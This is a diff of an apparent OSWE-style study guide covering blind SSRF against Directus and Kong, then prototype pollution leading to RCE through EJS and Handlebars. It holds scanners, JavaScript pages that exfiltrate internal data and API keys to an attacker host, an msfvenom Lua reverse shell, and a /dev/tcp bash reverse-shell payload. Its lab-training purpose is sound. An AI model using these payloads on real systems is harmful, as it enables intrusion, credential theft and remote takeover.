 <p>SSRF is confirmed when the server fetches our controlled URL. We supply a JSON body with a <code>url</code> parameter pointing to our Kali HTTP server and check the access log for incoming requests.</p>
+<figure><img src="./img/oswe/fig275-server-diagram.png" alt="Server diagram"></figure>
 
-<pre><code class="language-bash"># Test for SSRF — point the url parameter at our web server
+<pre><code class="language-bash"># Test for SSRF - point the url parameter at our web server
 curl -i -X POST -H "Content-Type: application/json" \
   -d '{"url":"http://[attacker-ip]/ssrftest"}' \
   http://[target-ip]:8000/files/import
@@ -5655,21 +5673,21 @@ curl -i -X POST -H "Content-Type: application/json" \
 sudo tail /var/log/apache2/access.log
 # [target-internal-ip] - - "GET /ssrftest HTTP/1.1" 404 455 "-" "axios/0.21.1"</code></pre>
 
-<p>The server fetched our URL using <code>axios/0.21.1</code> (a Node.js HTTP client). When the requested file exists, the server returns 403 Forbidden ("You don't have permission to access this."); when it doesn't exist, we get 500 Internal Server Error ("Request failed with status code 404"). This is a <strong>blind SSRF</strong> — the response content is not returned to us, but we can infer resource existence from different error messages.</p>
+<p>The server fetched our URL using <code>axios/0.21.1</code> (a Node.js HTTP client). When the requested file exists, the server returns 403 Forbidden ("You don't have permission to access this."); when it doesn't exist, we get 500 Internal Server Error ("Request failed with status code 404"). This is a <strong>blind SSRF</strong> - the response content is not returned to us, but we can infer resource existence from different error messages.</p>
 
 <table class="custom-table">
 <thead><tr><th>Server Response</th><th>Meaning</th></tr></thead>
 <tbody>
-<tr><td>403 Forbidden — "You don't have permission"</td><td>Valid resource found (SSRF fetched it successfully)</td></tr>
-<tr><td>500 — "Request failed with status code 404"</td><td>Resource does not exist</td></tr>
-<tr><td>500 — "connect ECONNREFUSED"</td><td>Host up, port closed</td></tr>
-<tr><td>500 — "connect EHOSTUNREACH"</td><td>Host not reachable / no route</td></tr>
+<tr><td>403 Forbidden - "You don't have permission"</td><td>Valid resource found (SSRF fetched it successfully)</td></tr>
+<tr><td>500 - "Request failed with status code 404"</td><td>Resource does not exist</td></tr>
+<tr><td>500 - "connect ECONNREFUSED"</td><td>Host up, port closed</td></tr>
+<tr><td>500 - "connect EHOSTUNREACH"</td><td>Host not reachable / no route</td></tr>
 <tr><td>Timeout</td><td>Host not reachable (firewall / non-existent)</td></tr>
 </tbody>
 </table>
 
 <h4 id="oswe-ssrf-source-analysis">11.4.1 Source Code Analysis</h4>
-<p>Directus is open source, so we can verify the root cause. The authentication middleware in <code>/api/src/middleware/authenticate.ts</code> creates a default accountability object with <code>user: null</code> and <code>role: null</code>, then calls <code>next()</code> if no token is present — it does not reject unauthenticated requests.</p>
+<p>Directus is open source, so we can verify the root cause. The authentication middleware in <code>/api/src/middleware/authenticate.ts</code> creates a default accountability object with <code>user: null</code> and <code>role: null</code>, then calls <code>next()</code> if no token is present - it does not reject unauthenticated requests.</p>
 
 <pre><code class="language-javascript">// /api/src/middleware/authenticate.ts (lines 12-21)
 const authenticate = asyncHandler(async (req, res, next) =&gt; {
@@ -5685,7 +5703,7 @@ const authenticate = asyncHandler(async (req, res, next) =&gt; {
   // ...
 });</code></pre>
 
-<p>The files controller in <code>/api/src/controllers/files.ts</code> calls <code>axios.get()</code> on the user-supplied URL at line 152 <strong>before</strong> any authorization check. The <code>readByKey()</code> call at line 170 is the first point where permissions are verified — but the SSRF request has already been sent by then.</p>
+<p>The files controller in <code>/api/src/controllers/files.ts</code> calls <code>axios.get()</code> on the user-supplied URL at line 152 <strong>before</strong> any authorization check. The <code>readByKey()</code> call at line 170 is the first point where permissions are verified - but the SSRF request has already been sent by then.</p>
 
 <pre><code class="language-javascript">// /api/src/controllers/files.ts (lines 138-183)
 router.post('/import', asyncHandler(async (req, res, next) =&gt; {
@@ -5709,7 +5727,7 @@ router.post('/import', asyncHandler(async (req, res, next) =&gt; {
     const primaryKey = await service.upload(fileResponse.data, payload);
 
     try {
-        // Authorization checked HERE — too late
+        // Authorization checked HERE - too late
         const record = await service.readByKey(primaryKey, req.sanitizedQuery);
         res.locals.payload = { data: record || null };
     } catch (error) {
@@ -5738,17 +5756,17 @@ sudo tail /var/log/apache2/access.log</code></pre></li>
 <h3 id="oswe-ssrf-blind-exploitation">11.5 Blind SSRF Exploitation</h3>
 
 <h4 id="oswe-ssrf-port-scanning">11.5.1 Port Scanning via SSRF</h4>
-<p>The different error messages enable an SSRF-based port scanner. Localhost on port 8000 returns ECONNREFUSED (Directus runs on a different host than Kong), but port 8055 (Directus default) returns a valid response — confirming we are inside the internal network.</p>
+<p>The different error messages enable an SSRF-based port scanner. Localhost on port 8000 returns ECONNREFUSED (Directus runs on a different host than Kong), but port 8055 (Directus default) returns a valid response - confirming we are inside the internal network.</p>
 
-<pre><code class="language-bash"># Test localhost — different host than the gateway
+<pre><code class="language-bash"># Test localhost - different host than the gateway
 curl -i -X POST -H "Content-Type: application/json" \
   -d '{"url":"http://localhost:8000/"}' http://[target-ip]:8000/files/import
 # {"errors":[{"message":"connect ECONNREFUSED 127.0.0.1:8000"...}]}
 
-# Directus default port — open!
+# Directus default port - open!
 curl -i -X POST -H "Content-Type: application/json" \
   -d '{"url":"http://localhost:8055/"}' http://[target-ip]:8000/files/import
-# 403 Forbidden — valid resource</code></pre>
+# 403 Forbidden - valid resource</code></pre>
 
 <pre><code class="language-python">#!/usr/bin/env python3
 # ssrf_port_scanner.py
@@ -5816,7 +5834,7 @@ curl -X POST -H "Content-Type: application/json" \
 # Total: 60.155041s</code></pre>
 
 <pre><code class="language-python">#!/usr/bin/env python3
-# ssrf_gateway_scanner.py — scan for live gateways on 172.16.x.1
+# ssrf_gateway_scanner.py - scan for live gateways on 172.16.x.1
 
 import argparse
 import requests
@@ -5852,7 +5870,7 @@ for y in range(16, 256):
 
 <pre><code class="language-bash"># Gateway scan finds a live host
 ./ssrf_gateway_scanner.py -t http://[target-ip]:8000/files/import
-# http://172.16.16.1 — OPEN - returned 404</code></pre>
+# http://172.16.16.1 - OPEN - returned 404</code></pre>
 
 <h4 id="oswe-ssrf-host-enum">11.5.3 Host and Port Enumeration</h4>
 <p>After discovering the 172.16.16.0/24 subnet, we scan all hosts for common service ports. The scan reveals the full internal topology of the Docker microservice environment.</p>
@@ -5896,23 +5914,24 @@ done</code></pre></li>
 
 <h3 id="oswe-ssrf-render-bypass">11.6 Render API Auth Bypass</h3>
 <p>The <code>/render</code> endpoint requires an API key through Kong. However, using the SSRF to call the backend Render service directly at <code>172.16.16.5:9000</code> bypasses the gateway's authentication entirely. Fuzzing the internal service reveals <code>/api/render</code> accepts a <code>url</code> query parameter.</p>
+<figure><img src="./img/oswe/fig276-updated-network-diagram.png" alt="Updated network diagram"></figure>
 
 <pre><code class="language-bash"># Fuzz internal render service paths
 ./ssrf_path_scanner.py -t http://[target-ip]:8000/files/import \
   -s http://172.16.16.5:9000 -p paths.txt --timeout 5
-# /api/render    400 Bad Request — valid endpoint, missing parameter
+# /api/render    400 Bad Request - valid endpoint, missing parameter
 
 # Fuzz query parameters
 ./ssrf_path_scanner.py -t http://[target-ip]:8000/files/import \
   -s http://172.16.16.5:9000/api/render -p params.txt --timeout 5
 # ?url=http://[attacker-ip]/render/url    OPEN - permission error</code></pre>
 
-<pre><code class="language-bash"># Check Apache log — Headless Chrome made the request!
+<pre><code class="language-bash"># Check Apache log - Headless Chrome made the request!
 sudo tail /var/log/apache2/access.log
 # [target-ip] "GET /render/url HTTP/1.1" 404 492 "-"
 #   "Mozilla/5.0 ... HeadlessChrome/79.0.3945.0 Safari/537.36"</code></pre>
 
-<p>The Render service is a URL-to-PDF microservice powered by Puppeteer and Headless Chrome. It loads the provided URL in a real browser environment — meaning it will <strong>execute JavaScript</strong>.</p>
+<p>The Render service is a URL-to-PDF microservice powered by Puppeteer and Headless Chrome. It loads the provided URL in a real browser environment - meaning it will <strong>execute JavaScript</strong>.</p>
 
 
 <h4>Methodology</h4>
@@ -5924,15 +5943,16 @@ curl -X POST -H "Content-Type: application/json" \
   -d '{"url":"http://[internal-ip]:9000/api/render"}' \
   http://[target-ip]:8000/files/import</code></pre></li>
 <li><label><input type="checkbox"> Fuzz the internal service for valid paths and query parameters</label></li>
-<li><label><input type="checkbox"> Check callback User-Agent strings for browser indicators (<code>HeadlessChrome</code>) — these services execute JavaScript</label></li>
+<li><label><input type="checkbox"> Check callback User-Agent strings for browser indicators (<code>HeadlessChrome</code>) - these services execute JavaScript</label></li>
 </ul>
 
 <h3 id="oswe-ssrf-headless-chrome">11.7 Exploiting Headless Chrome</h3>
 <p>Headless Chrome executes JavaScript when loading pages. Hosting malicious HTML that runs arbitrary JS in the internal network context turns a blind SSRF into full data exfiltration and eventually RCE.</p>
+<figure><img src="./img/oswe/fig277-ssrf-attack-chain.png" alt="SSRF Attack Chain"></figure>
 
 <h4 id="oswe-ssrf-js-verification">11.7.1 Verifying JavaScript Execution</h4>
 
-<pre><code class="language-xml">&lt;!-- hello.html — verify JS execution via callback --&gt;
+<pre><code class="language-xml">&lt;!-- hello.html - verify JS execution via callback --&gt;
 &lt;html&gt;
 &lt;head&gt;
 &lt;script&gt;
@@ -5958,7 +5978,7 @@ curl -X POST -H "Content-Type: application/json" \
 <h4 id="oswe-ssrf-data-exfil">11.7.2 Exfiltrating Internal Data</h4>
 <p>With JavaScript execution confirmed, we use <code>fetch()</code> to call internal APIs from the browser context and send the response data back to our server as URL-encoded query parameters.</p>
 
-<pre><code class="language-xml">&lt;!-- exfil.html — exfiltrate internal API data --&gt;
+<pre><code class="language-xml">&lt;!-- exfil.html - exfiltrate internal API data --&gt;
 &lt;html&gt;
 &lt;head&gt;
 &lt;script&gt;
@@ -5986,7 +6006,7 @@ curl -X POST -H "Content-Type: application/json" \
 <h4 id="oswe-ssrf-steal-apikey">11.7.3 Stealing the Kong API Key</h4>
 <p>The Kong Admin API exposes a <code>/key-auths</code> endpoint that returns all configured API keys. We modify our exfiltration payload to call this endpoint and retrieve the key needed to authenticate directly against the <code>/render</code> service.</p>
 
-<pre><code class="language-xml">&lt;!-- steal_key.html — steal API keys from Kong Admin API --&gt;
+<pre><code class="language-xml">&lt;!-- steal_key.html - steal API keys from Kong Admin API --&gt;
 &lt;html&gt;
 &lt;head&gt;
 &lt;script&gt;
@@ -6006,7 +6026,7 @@ function exfiltrate() {
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-<pre><code class="language-json">// Decoded callback data — the API key
+<pre><code class="language-json">// Decoded callback data - the API key
 {
   "next": null,
   "data": [{
@@ -6040,16 +6060,17 @@ curl -i "http://[target-ip]:8000/render?url=http://example.com&amp;apikey=[stole
 </ul>
 
 <h3 id="oswe-ssrf-render-source">11.8 Render Service Source Code Analysis</h3>
-<p>The Render service is based on the open-source <code>url-to-pdf-api</code> project. It uses Puppeteer to drive Headless Chrome. Input validation in <code>/src/util/validation.js</code> restricts the <code>url</code> parameter to HTTP/HTTPS schemes via a Joi schema — blocking <code>file://</code> protocol access.</p>
+<p>The Render service is based on the open-source <code>url-to-pdf-api</code> project. It uses Puppeteer to drive Headless Chrome. Input validation in <code>/src/util/validation.js</code> restricts the <code>url</code> parameter to HTTP/HTTPS schemes via a Joi schema - blocking <code>file://</code> protocol access.</p>
+<figure><img src="./img/oswe/fig278-network-diagram.png" alt="Network diagram"></figure>
 
-<pre><code class="language-javascript">// /src/util/validation.js — URL scheme restriction
+<pre><code class="language-javascript">// /src/util/validation.js - URL scheme restriction
 const urlSchema = Joi.string().uri({
     scheme: ['http', 'https'],
 });</code></pre>
 
 <pre><code class="language-bash"># Verify file:// is blocked
 curl "http://[target-ip]:8000/render?url=file:///etc/passwd&amp;apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC"
-# 400 Bad Request — "url" must be a valid uri with scheme matching http|https</code></pre>
+# 400 Bad Request - "url" must be a valid uri with scheme matching http|https</code></pre>
 
 <p>The core render function in <code>/src/core/render-core.js</code> uses <code>page.goto(opts.url)</code> to navigate the browser to the submitted URL, then captures the result as a PDF or HTML. Since we can execute arbitrary JavaScript via page content, the scheme restriction does not prevent exploitation.</p>
 
@@ -6059,13 +6080,13 @@ curl "http://[target-ip]:8000/render?url=file:///etc/passwd&amp;apikey=SBzrCb94o
 <li><label><input type="checkbox"> Clone or download the open-source render service repository for local analysis</label></li>
 <li><label><input type="checkbox"> Review input validation in <code>validation.js</code> for URL scheme restrictions (<code>http</code>/<code>https</code> only blocks <code>file://</code>)</label>
 <pre><code class="language-bash">grep -rn "scheme\|protocol\|uri\|Joi" --include="*.js" /path/to/render-service/src/</code></pre></li>
-<li><label><input type="checkbox"> Examine <code>render-core.js</code> for <code>page.goto()</code> and <code>page.pdf()</code> calls — confirm full browser rendering with JavaScript execution</label></li>
+<li><label><input type="checkbox"> Examine <code>render-core.js</code> for <code>page.goto()</code> and <code>page.pdf()</code> calls - confirm full browser rendering with JavaScript execution</label></li>
 <li><label><input type="checkbox"> Determine if any Content Security Policy or navigation restrictions are applied to the Puppeteer browser context</label></li>
 <li><label><input type="checkbox"> Verify that scheme restrictions do not prevent exploitation via JavaScript execution in loaded pages (they do not block <code>fetch()</code> from JS context)</label></li>
 </ul>
 
 <h3 id="oswe-ssrf-rce">11.9 Remote Code Execution</h3>
-<p>Kong API Gateway supports a <strong>Serverless Functions</strong> plugin (<code>pre-function</code>) that executes arbitrary Lua code on every request to a service. This plugin is loaded in the target environment. We use JavaScript running in Headless Chrome to create a new Kong service, add a route, and attach a Lua reverse shell as a pre-function plugin — all via the internal Admin API.</p>
+<p>Kong API Gateway supports a <strong>Serverless Functions</strong> plugin (<code>pre-function</code>) that executes arbitrary Lua code on every request to a service. This plugin is loaded in the target environment. We use JavaScript running in Headless Chrome to create a new Kong service, add a route, and attach a Lua reverse shell as a pre-function plugin - all via the internal Admin API.</p>
 
 <h4 id="oswe-ssrf-lua-payload">11.9.1 Generating the Lua Payload</h4>
 <pre><code class="language-bash"># Generate a Lua reverse shell with msfvenom
@@ -6078,7 +6099,7 @@ msfvenom -p cmd/unix/reverse_lua lhost=[attacker-ip] lport=[listener-port] -f ra
 # local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();</code></pre>
 
 <h4 id="oswe-ssrf-rce-payload">11.9.2 JavaScript RCE Payload</h4>
-<pre><code class="language-xml">&lt;!-- rce.html — create Kong service + route + pre-function reverse shell --&gt;
+<pre><code class="language-xml">&lt;!-- rce.html - create Kong service + route + pre-function reverse shell --&gt;
 &lt;html&gt;
 &lt;head&gt;
 &lt;script&gt;
@@ -6172,7 +6193,7 @@ ls -al
   -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt \
   -s "200,204,301,302,307,401,403,405,500"</code></pre>
   </li>
-  <li><label><input type="checkbox" data-id="oswe-11-1"> Verb tamper discovered endpoints — compare GET vs POST responses</label>
+  <li><label><input type="checkbox" data-id="oswe-11-1"> Verb tamper discovered endpoints - compare GET vs POST responses</label>
     <pre><code class="language-bash">./route_buster.py -a /usr/share/wordlists/dirb/small.txt \
   -w endpoints.txt -t http://[target-ip]:8000</code></pre>
   </li>
@@ -6191,7 +6212,7 @@ ls -al
   </li>
   <li><label><input type="checkbox" data-id="oswe-11-6"> Enumerate open ports on discovered internal hosts</label></li>
   <li><label><input type="checkbox" data-id="oswe-11-7"> Bypass gateway auth by calling backend services directly via SSRF</label></li>
-  <li><label><input type="checkbox" data-id="oswe-11-8"> If Headless Chrome is found — host malicious HTML with JS exfiltration</label>
+  <li><label><input type="checkbox" data-id="oswe-11-8"> If Headless Chrome is found - host malicious HTML with JS exfiltration</label>
     <pre><code class="language-bash">curl -X POST -H "Content-Type: application/json" \
   -d '{"url":"http://[internal-render]:9000/api/render?url=http://[attacker-ip]/exfil.html"}' \
   http://[target-ip]:8000/files/import</code></pre>
@@ -6214,16 +6235,17 @@ curl http://[target-ip]:8000/supersecret</code></pre>
 
 <h3 id="oswe-prototype-pollution-overview">12.1 Overview</h3>
 <p>Prototype pollution is a JavaScript vulnerability where an attacker injects properties into <code>Object.prototype</code>, affecting every object in the application. Server-side prototype pollution was popularized by Olivier Arteau at NorthSec 2018. The vulnerability typically appears in libraries that perform recursive object merging or extending.</p>
+<figure><img src="./img/oswe/fig279-chips-homepage.png" alt="Chips Homepage"></figure>
 
 <p>The target is a custom application called "Chips" that uses <code>guacamole-lite</code> (a Node.js package for browser-based RDP connections) alongside various templating engines. The <code>guacamole-lite</code> package depends on <code>deep-extend@0.4.2</code>, which is vulnerable to prototype pollution when processing untrusted user input. We exploit this to achieve RCE against two different templating engines: EJS and Handlebars.</p>
 
 <table class="custom-table">
 <thead><tr><th>Component</th><th>Detail</th></tr></thead>
 <tbody>
-<tr><td>Target App</td><td>Chips — RDP-via-browser using guacamole-lite</td></tr>
+<tr><td>Target App</td><td>Chips - RDP-via-browser using guacamole-lite</td></tr>
 <tr><td>Vulnerable Library</td><td><code>deep-extend@0.4.2</code> (dependency of <code>guacamole-lite@0.6.3</code>)</td></tr>
 <tr><td>Approach</td><td>Whitebox (source review) + Blackbox (crash-based detection)</td></tr>
-<tr><td>Template Engines</td><td>EJS, Handlebars (hbs), Pug — selectable via <code>TEMPLATING_ENGINE</code> env var</td></tr>
+<tr><td>Template Engines</td><td>EJS, Handlebars (hbs), Pug - selectable via <code>TEMPLATING_ENGINE</code> env var</td></tr>
 <tr><td>URL</td><td><code>http://chips/</code></td></tr>
 <tr><td>SSH</td><td><code>[username]:[password]</code></td></tr>
 </tbody>
@@ -6238,6 +6260,7 @@ curl http://[target-ip]:8000/supersecret</code></pre>
   <li><label><input type="checkbox"> Check package.json or npm dependencies for libraries with known prototype pollution CVEs</label>
     <pre><code class="language-bash">npm audit
 # Or search: https://snyk.io/vuln/?type=npm&amp;q=prototype+pollution</code></pre>
+<figure><img src="./img/oswe/fig285-chips-advanced-connection-settings.png" alt="Chips Advanced Connection Settings"></figure>
   </li>
   <li><label><input type="checkbox"> Identify JSON-accepting endpoints that may pass user input to merge or extend functions</label></li>
   <li><label><input type="checkbox"> Review the dependency tree for recursive merge/extend libraries</label>
@@ -6259,7 +6282,7 @@ grep -r "view engine" app.js</code></pre>
 <tbody>
 <tr><td><code>/tokens</code></td><td>POST</td><td>Accepts JSON connection settings, returns encrypted token</td></tr>
 <tr><td><code>/rdp?token=</code></td><td>GET</td><td>Loads the RDP page using the encrypted token</td></tr>
-<tr><td><code>/guaclite?token=</code></td><td>GET</td><td>WebSocket upgrade — guacamole-lite processes the token here</td></tr>
+<tr><td><code>/guaclite?token=</code></td><td>GET</td><td>WebSocket upgrade - guacamole-lite processes the token here</td></tr>
 </tbody>
 </table>
 
@@ -6335,10 +6358,10 @@ TEMPLATING_ENGINE=ejs docker-compose up</code></pre></li>
 </ul>
 
 <h3 id="oswe-prototype-pollution-fundamentals">12.3 JavaScript Prototype Fundamentals</h3>
-<p>Nearly everything in JavaScript is an object — arrays, browser APIs, and functions. The only exceptions are <code>null</code>, <code>undefined</code>, strings, numbers, booleans, and symbols. Unlike class-based languages, JavaScript uses prototypal inheritance where objects inherit directly from other objects.</p>
+<p>Nearly everything in JavaScript is an object - arrays, browser APIs, and functions. The only exceptions are <code>null</code>, <code>undefined</code>, strings, numbers, booleans, and symbols. Unlike class-based languages, JavaScript uses prototypal inheritance where objects inherit directly from other objects.</p>
 
 <h4 id="oswe-prototype-pollution-chain">12.3.1 Prototype Chain</h4>
-<p>Every object has a private <code>__proto__</code> property linking to its prototype. Property lookups walk this chain until reaching <code>Object.prototype</code> (which has <code>null</code> as its prototype). The <code>class</code> keyword in ES2015 is syntactic sugar for constructor functions — both create objects via <code>new</code>.</p>
+<p>Every object has a private <code>__proto__</code> property linking to its prototype. Property lookups walk this chain until reaching <code>Object.prototype</code> (which has <code>null</code> as its prototype). The <code>class</code> keyword in ES2015 is syntactic sugar for constructor functions - both create objects via <code>new</code>.</p>
 
 <pre><code class="language-javascript">// Constructor function (pre-ES2015 pattern)
 function Student() {
@@ -6370,7 +6393,7 @@ s.__proto__ === Student.prototype;  // true</code></pre>
 <pre><code class="language-javascript">// The chain resolves the FIRST match found
 s.isActive();  // Uses Student.prototype.isActive
 
-// Override at the object level — shadows the prototype
+// Override at the object level - shadows the prototype
 s.isActive = function() {
     console.log("New isActive");
     return true;
@@ -6384,7 +6407,7 @@ s.__proto__.isActive();
 // Checking if active
 // undefined
 
-// Delete override — chain falls back to prototype
+// Delete override - chain falls back to prototype
 delete s.isActive;
 s.isActive();
 // Checking if active
@@ -6408,7 +6431,7 @@ s.toString();
 {}.toString();
 // in Object prototype
 // TypeError: Cannot read property 'toString' of undefined
-// (blank object has no .id — but the polluted function still ran)</code></pre>
+// (blank object has no .id - but the polluted function still ran)</code></pre>
 
 <p>Changes to <code>Object.prototype</code> persist until the Node.js process restarts. In web applications, once the prototype is polluted it affects all subsequent requests until reboot.</p>
 
@@ -6429,6 +6452,7 @@ delete Object.prototype.testProp;</code></pre></li>
 
 <h3 id="oswe-prototype-pollution-vuln-merge">12.4 Vulnerable Merge Functions</h3>
 <p>Prototype pollution most commonly occurs in recursive merge or extend functions. These iterate over object keys and recursively merge nested objects. When user-controlled input contains <code>__proto__</code> as a key, the merge walks into the prototype chain and injects properties into <code>Object.prototype</code>.</p>
+<figure><img src="./img/oswe/fig293-adding-payload-to-settings-object.png" alt="Adding Payload to Settings Object"></figure>
 
 <h4 id="oswe-prototype-pollution-vuln-pattern">12.4.1 Vulnerable Pattern</h4>
 <pre><code class="language-javascript">const { isObject } = require("util");
@@ -6454,15 +6478,15 @@ merge(x, y);
 x = { hello: "world" };
 y = { ["__proto__"]: { polluted: "yes" } };
 merge(x, y);
-// { hello: 'world' }  — looks normal, but:
+// { hello: 'world' }  - looks normal, but:
 
 {}.polluted;
-// 'yes'  — ALL objects now have .polluted!</code></pre>
+// 'yes'  - ALL objects now have .polluted!</code></pre>
 
 <p>Square brackets around <code>__proto__</code> make the property enumerable in the <code>for...in</code> loop. When the merge function hits <code>__proto__</code>, <code>a["__proto__"]</code> resolves to the prototype link (always an object), so the recursive branch fires and writes nested properties directly into <code>Object.prototype</code>.</p>
 
 <h4 id="oswe-prototype-pollution-safe-pattern">12.4.2 Non-Vulnerable Pattern</h4>
-<pre><code class="language-javascript">// This merge is NOT vulnerable — no recursion
+<pre><code class="language-javascript">// This merge is NOT vulnerable - no recursion
 function badMerge(a, b) {
     for (var key in b) {
         a[key] = b[key];
@@ -6474,10 +6498,11 @@ function badMerge(a, b) {
 x = { foo: { bar: "foobar" } };
 y = { foo: { hello: "world" } };
 badMerge(x, y);
-// { foo: { hello: 'world' } }  — bar is lost, not merged
+// { foo: { hello: 'world' } }  - bar is lost, not merged
 
 // Without recursion, __proto__ assignment replaces rather than traverses
 // so prototype pollution does not occur</code></pre>
+<figure><img src="./img/oswe/fig294-application-crashes.png" alt="Application Crashes"></figure>
 
 <h4 id="oswe-prototype-pollution-enumeration">12.4.3 Pollution Side Effects</h4>
 <pre><code class="language-javascript">// Polluted vars are enumerable in for...in loops
@@ -6516,7 +6541,7 @@ console.log({}.polluted);  // "yes" if vulnerable</code></pre></li>
 </ul>
 
 <h3 id="oswe-prototype-pollution-discovery-blackbox">12.5 Blackbox Discovery</h3>
-<p>To detect prototype pollution blindly, overwrite a commonly-used function like <code>toString</code> with a string. If the application crashes, prototype pollution is confirmed. The payload must be placed in the correct position within the JSON — specifically inside the object that gets passed to a vulnerable merge function.</p>
+<p>To detect prototype pollution blindly, overwrite a commonly-used function like <code>toString</code> with a string. If the application crashes, prototype pollution is confirmed. The payload must be placed in the correct position within the JSON - specifically inside the object that gets passed to a vulnerable merge function.</p>
 
 <h4 id="oswe-prototype-pollution-discovery">12.5.1 Crash-Based Detection</h4>
 <pre><code class="language-json">// Step 1: POST to /tokens with pollution in "settings" (the merged object)
@@ -6567,6 +6592,7 @@ TypeError: Object.prototype.toString.call is not a function
 
 <h3 id="oswe-prototype-pollution-discovery-whitebox">12.6 Whitebox Discovery</h3>
 <p>Start by checking the application source for computed property access patterns (<code>a[key] = b[key]</code>). Then audit third-party packages for merge/extend functions. Use <code>npm list</code> and <code>npm audit</code> to identify vulnerable libraries.</p>
+<figure><img src="./img/oswe/fig298-application-crash.png" alt="Application Crash"></figure>
 
 <h4 id="oswe-prototype-pollution-npm-audit">12.6.1 Package Enumeration</h4>
 <pre><code class="language-bash"># List production dependencies (depth 1)
@@ -6574,10 +6600,10 @@ $ npm list -prod -depth 1
 app@0.0.0 /usr/src/app
 +-- ejs@3.1.6
 +-- express@4.16.4
-|   +-- merge-descriptors@1.0.1   # non-recursive — safe
-|   +-- utils-merge@1.0.1         # non-recursive — safe
+|   +-- merge-descriptors@1.0.1   # non-recursive - safe
+|   +-- utils-merge@1.0.1         # non-recursive - safe
 +-- guacamole-lite@0.6.3
-|   +-- deep-extend@0.4.2         # RECURSIVE EXTEND — vulnerable!
+|   +-- deep-extend@0.4.2         # RECURSIVE EXTEND - vulnerable!
 |   +-- moment@2.29.1
 |   +-- ws@1.1.5
 +-- hbs@4.1.1
@@ -6621,7 +6647,7 @@ var deepExtend = module.exports = function (/*obj_1, [obj_2], [obj_N]*/) {
 
     return target;
 };
-// No filtering of __proto__ — vulnerable to prototype pollution</code></pre>
+// No filtering of __proto__ - vulnerable to prototype pollution</code></pre>
 
 <h4 id="oswe-prototype-pollution-clientconnection">12.6.3 Vulnerable Call Site in guacamole-lite</h4>
 <pre><code class="language-javascript">// node_modules/guacamole-lite/lib/ClientConnection.js
@@ -6670,7 +6696,7 @@ grep -rn "DeepExtend\|deep-extend\|deepExtend" --include="*.js" node_modules/gua
 <h4 id="oswe-prototype-pollution-ejs-poc">12.7.1 EJS Detection (PoC)</h4>
 <p>EJS reads <code>opts.escape</code> (or <code>opts.escapeFunction</code>) during template compilation. If this value is a string instead of a function, the template crashes with <code>esc is not a function</code>. This confirms the app uses EJS.</p>
 
-<pre><code class="language-javascript">// node_modules/ejs/lib/ejs.js — Template class constructor
+<pre><code class="language-javascript">// node_modules/ejs/lib/ejs.js - Template class constructor
 options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
 
 // Normal: escape is a function. Polluted: escape is a string → crash
@@ -6745,7 +6771,7 @@ compile: function () {
   }
 }</code></pre>
 
-<p>After sending the payload: (1) POST to <code>/tokens</code> to get the encrypted token, (2) send the token to <code>/guaclite</code> to trigger the merge and pollute the prototype, (3) load any page to trigger EJS template rendering — the injected code executes on every page render.</p>
+<p>After sending the payload: (1) POST to <code>/tokens</code> to get the encrypted token, (2) send the token to <code>/guaclite</code> to trigger the merge and pollute the prototype, (3) load any page to trigger EJS template rendering - the injected code executes on every page render.</p>
 
 <pre><code class="language-bash"># Reverse shell payload variant
 "outputFunctionName": "x=1;process.mainModule.require('child_process').execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/[attacker-ip]/9000 0&gt;&amp;1\"');y"
@@ -6758,7 +6784,7 @@ chips_1     | GET / 200 32.799 ms - 4962</code></pre>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Confirm EJS is active by polluting <code>escape</code> with a string — the app crashes with <code>esc is not a function</code></label>
+<li><label><input type="checkbox"> Confirm EJS is active by polluting <code>escape</code> with a string - the app crashes with <code>esc is not a function</code></label>
 <pre><code class="language-bash"># Send pollution payload, trigger merge via WebSocket, then load a page
 # Crash in docker logs confirms EJS
 docker-compose logs chips | grep "esc is not a function"</code></pre></li>
@@ -6767,13 +6793,16 @@ docker-compose logs chips | grep "esc is not a function"</code></pre></li>
 <li><label><input type="checkbox"> Pollute <code>outputFunctionName</code> with a JavaScript payload that completes the <code>var</code> declaration on both sides</label></li>
 <li><label><input type="checkbox"> Verify code execution via <code>whoami</code> output in docker logs</label>
 <pre><code class="language-bash">docker-compose logs --tail=20 chips</code></pre></li>
-<li><label><input type="checkbox"> Replace the detection payload with a reverse shell payload and start a listener with <code>nc -lvnp [listener-port]</code></label>
-<p>Use <code>"x=1;process.mainModule.require('child_process').execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1\"');y"</code> as the polluted <code>outputFunctionName</code> value.</p></li>
+<li><label><input type="checkbox"> Replace the detection payload with a reverse shell and start a listener</label>
+<pre><code class="language-bash">nc -lvnp 9000
+# Payload: "x=1;process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/[attacker-ip]/9000 0>&1\"');y"</code></pre></li>
 <li><label><input type="checkbox"> Trigger the full chain: POST <code>/tokens</code>, connect to <code>/guaclite</code>, load any page</label></li>
 </ul>
 
 <h3 id="oswe-prototype-pollution-handlebars">12.8 Handlebars Template Engine RCE</h3>
 <p>Handlebars is significantly more complex than EJS (~5142 lines). It defines its own templating language and compiles templates through three phases: parsing (text → AST), opcode generation (AST → opcodes), and JavaScript compilation (opcodes → executable function).</p>
+<figure><img src="./img/oswe/fig301-handlebars-compilation-sequence-diagram.png" alt="Handlebars Compilation Sequence Diagram"></figure>
+<figure><img src="./img/oswe/fig302-setting-pendingcontent-in-payload.png" alt="Setting pendingContent in Payload"></figure>
 
 <h4 id="oswe-prototype-pollution-hbs-compilation">12.8.1 Handlebars Compilation Flow</h4>
 <table class="custom-table">
@@ -6808,7 +6837,7 @@ function parseWithoutProcessing(input, options) {
 }</code></pre>
 
 <h4 id="oswe-prototype-pollution-hbs-poc">12.8.2 Handlebars Detection (PoC)</h4>
-<p>The <code>appendContent</code> function in <code>javascript-compiler.js</code> prepends <code>this.pendingContent</code> to the current content. Polluting <code>pendingContent</code> injects visible text into the rendered template — confirming Handlebars without crashing the app. However, the content is escaped by <code>quotedString()</code>, so this cannot reach RCE.</p>
